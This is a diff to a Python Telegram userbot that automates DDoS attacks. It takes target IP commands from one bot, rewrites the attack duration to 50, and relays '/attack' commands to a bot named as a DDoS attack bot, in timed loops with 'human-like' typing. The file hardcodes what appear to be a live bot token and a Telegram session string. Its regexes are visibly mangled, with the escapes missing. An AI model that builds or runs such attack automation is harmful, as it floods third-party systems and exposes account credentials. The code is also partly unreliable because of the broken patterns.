@@ -14,9 +14,7 @@ BOT_TOKEN = "8489391478:AAFn0e-HJplScgnrZ5YH0f2Gc8Q1KO9VeyQ"
 BOT_A = "@botbysahilbot"          # IP BOT
 BOT_B = "@DDOS_Aditya_xd_bot"     # Attack BOT
 
-
-STRING_SESSION = "1BVtsOKEBuwrK8qxvmy15Glw3WMpdO6sLWyYPWJrT_srehGTLqvYQ-h79-TY6GRqf9JfkAHjjzeN2HK-EWRJBlZnep2DpbOSNaqnDGQr3vjlGK9HY42PNWQWopuw-NKZcFYkQkL5aTNmhLw9oIgj0Yv1dCxEVIsK1RlDz8MeV3gw3NOOBO_ugSSiNwQWm9p-LLxDNirZrGBHsPu6ldDZx3ugqYbjqq1lZqBX30-VA_iPxbe-tCfHAJYAuKFsgH17iB-Q5f4HsKYQWGqx2ifgnDXsZhbtlfj7SkU16c4GJzicV9fuKMcJLhjbC2Gt48chDdtShhyBilakU0beFCt4EhgyAxccsPUI="
-
+STRING_SESSION = "1BVtsOKEBuwrK8qxvmy15Glw3WMpdO6sLWyYPWJrT_srehGTLqvYQ-h79-TY6GRqf9JfkAHjjzeN2HK-EWRJBlZnep2DpbOSNaqnDGQr3vjlGK9HY42PNWQWopuw-NKcFYkQkL5aTNmhLw9oIgj0Yv1dCxEVIsK1RlDz8MeV3gw3NOOBO_ugSSiNwQWm9p-LLxDNirZrGBHsPu6ldDZx3ugqYbjqq1lZqBX30-VA_iPxbe-tCfHAJYAuKFsgH17iB-Q5f4HsKYQWGqx2ifgnDXsZhbtlfj7SkU16c4GJzicV9fuKMcJLhjbC2Gt48chDdtShhyBilakU0beFCt4EhgyAxccsPUI="
 tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)
 
 # --------- STATE ---------
@@ -26,8 +24,8 @@ chat_counts: dict[int, int] = {}
 ip_waiters: dict[int, asyncio.Future] = {}
 bot_b_status = "UNKNOWN"
 
-auto_tasks: dict[int, asyncio.Task] = {}   # har chat ka autoloop task
-BASE_DELAY = 60                            # attacks ke beech fixed 1 min
+auto_tasks: dict[int, asyncio.Task] = {}
+BASE_DELAY = 70   # har attack ke baad fixed 70s wait
 
 
 # ---------- HELPERS (human-like) ----------
@@ -49,24 +47,23 @@ async def ip_bot_listener(event):
     text = event.text or ""
     print("📩 IP BOT REPLY:", repr(text))
 
-    # CMD: line dhoondo
     m_line = re.search(r"CMD:(.+)", text, flags=re.IGNORECASE)
     if not m_line:
         return
 
     line = m_line.group(1).strip()
 
-    # backticks ke andar se command
     m_cmd = re.search(r"`([^`]+)`", line)
     if m_cmd:
         raw_cmd = m_cmd.group(1).strip()
     else:
         raw_cmd = line.lstrip("* ").strip()
 
-    # /attack ip port time pattern
-    m_attack = re.search(r"(/attacks+S+s+S+s+S+)", raw_cmd)
+    # attack time ko 50 fix karne ka example
+    m_attack = re.search(r"(/attacks+S+s+S+s+)(d+)", raw_cmd)
     if m_attack:
-        final_cmd = m_attack.group(1).strip()
+        prefix = m_attack.group(1)
+        final_cmd = prefix + "50"
     else:
         final_cmd = raw_cmd
 
@@ -154,7 +151,7 @@ async def single_round(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
-# ---------- AUTO LOOP WORKER (task) ----------
+# ---------- AUTO LOOP WORKER (fixed delay) ----------
 
 async def autoloop_worker(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
     count = chat_counts.get(chat_id, 1)
@@ -162,7 +159,7 @@ async def autoloop_worker(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
     await human_type_and_send(
         context,
         chat_id,
-        f"🔁 Auto loop start kar raha hu.Attacks: {count}Base delay: {BASE_DELAY}s + human typing."
+        f"🔁 Auto loop start kar raha hu.Attacks: {count}Fixed delay: {BASE_DELAY}s har attack ke baad."
     )
 
     try:
@@ -176,20 +173,14 @@ async def autoloop_worker(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
             await single_round(chat_id, context)
 
             if i == count - 1:
-                break
-
-            # yahan tak agar stop aaya to CancelledError raise ho jayega
-            jitter = random.randint(0, 30)
-            total_delay = BASE_DELAY + jitter
+                break  # last attack, ab delay nahi
 
             await human_type_and_send(
                 context,
                 chat_id,
-                f"⏳ Next attack se pehle ~{total_delay}s wait karunga…"
+                f"⏳ Next attack se pehle {BASE_DELAY}s wait karunga…"
             )
-
-            # per-second check nahi chahiye, cancel directly sleep pe lagega
-            await asyncio.sleep(total_delay)
+            await asyncio.sleep(BASE_DELAY)  # yahi fixed gap hai
 
     except asyncio.CancelledError:
         await human_type_and_send(
@@ -213,7 +204,7 @@ Commands:
 /setlinkchatid <link_or_chatid>  - Target group/chat set karo
 /setcount <number_of_attacks>   - Kitne attacks chahiye
 /startloop                      - Ek single attack
-/autoloop                       - Auto attacks (human-like)
+/autoloop                       - Fixed delay ke sath auto attacks
 /stoploop                       - Auto loop turant band karo
 """
     await human_type_and_send(context, update.effective_chat.id, text.strip())
